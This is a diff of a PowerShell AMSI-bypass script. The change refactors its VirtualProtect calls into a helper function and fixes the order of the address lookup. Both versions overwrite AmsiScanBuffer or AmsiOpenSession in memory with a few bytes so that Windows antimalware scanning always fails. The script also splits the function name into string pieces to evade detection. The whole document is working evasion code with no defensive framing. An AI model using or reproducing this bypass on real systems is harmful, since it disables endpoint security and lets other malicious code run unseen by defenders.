@@ -12,31 +12,36 @@ function getDelegateType {
  $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType,$func).SetImplementationFlags('Runtime, Managed')
  return $type.CreateType()
 }
-
-$VirtualProtectAddr = LookupFunc kernel32.dll VirtualProtect
-$VirtualProtectDelegateType = getDelegateType @([IntPtr], [UInt32], [UInt32],[UInt32].MakeByRefType())([Bool])
-$VirtualProtect =[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegateType)
-$oldProtectionBuffer = 0
-if ($VirtualProtect.Invoke($funcAddr,3, 0x40, [ref]$oldProtectionBuffer)){
-    if([System.IntPtr]::Size -eq 4){
-        $f = 'Ams'+'iScanBuffer'
-        [IntPtr]$funcAddr = LookupFunc amsi.dll $f
-        $syserror = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00)
-        #mov eax,80070057h
-        #ret 18h
-        [System.Runtime.InteropServices.Marshal]::Copy($syserror, 0, $funcAddr, 8);
-    }else
-    {
-        [IntPtr]$funcAddr = LookupFunc Amsi.dll AmsiOpenSession
-        $xorrax = [Byte[]] (0x48,0x31,0xC0)
-        # xor rax,rax
-        [System.Runtime.InteropServices.Marshal]::WriteByte($funcAddr,0,$xorrax[0])
-        [System.Runtime.InteropServices.Marshal]::WriteByte($funcAddr,1,$xorrax[1])
-        [System.Runtime.InteropServices.Marshal]::WriteByte($funcAddr,2,$xorrax[2])
-    }
-
-    $VirtualProtect.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
+function PageChange {
+    param($faddress,$mconstants)
+    $VirtualProtectAddr = LookupFunc kernel32.dll VirtualProtect
+    $VirtualProtectDelegateType = getDelegateType @([IntPtr], [UInt32], [UInt32],[UInt32].MakeByRefType())([Bool])
+    $VirtualProtect =[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegateType)
+    $oldProtectionBuffer = 0
+    return $VirtualProtect.Invoke($faddress,3,$mconstants,[ref]$oldProtectionBuffer)
 }
 
-
-
+if([System.IntPtr]::Size -eq 4){
+    $f = 'Ams'+'iScanBuffer'
+    [IntPtr]$funcSBuffer = LookupFunc amsi.dll $f
+    [bool]$pageresult = PageChange $funcSBuffer 0x40
+    if ($pageresult){
+    $syserror = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00)
+    #mov eax,80070057h
+    #ret 18h
+    [System.Runtime.InteropServices.Marshal]::Copy($syserror, 0, $funcSBuffer, 8)
+    PageChange $funcSBuffer 0x20
+    }
+}else
+{
+    [IntPtr]$funcSession = LookupFunc Amsi.dll AmsiOpenSession
+    $xorrax = [Byte[]] (0x48,0x31,0xC0)
+    # xor rax,rax
+    [bool]$pageresult = PageChange $funcSession 0x40
+    if ($pageresult){
+    [System.Runtime.InteropServices.Marshal]::WriteByte($funcSession,0,$xorrax[0])
+    [System.Runtime.InteropServices.Marshal]::WriteByte($funcSession,1,$xorrax[1])
+    [System.Runtime.InteropServices.Marshal]::WriteByte($funcSession,2,$xorrax[2])
+    PageChange $funcSession 0x20
+    }
+}
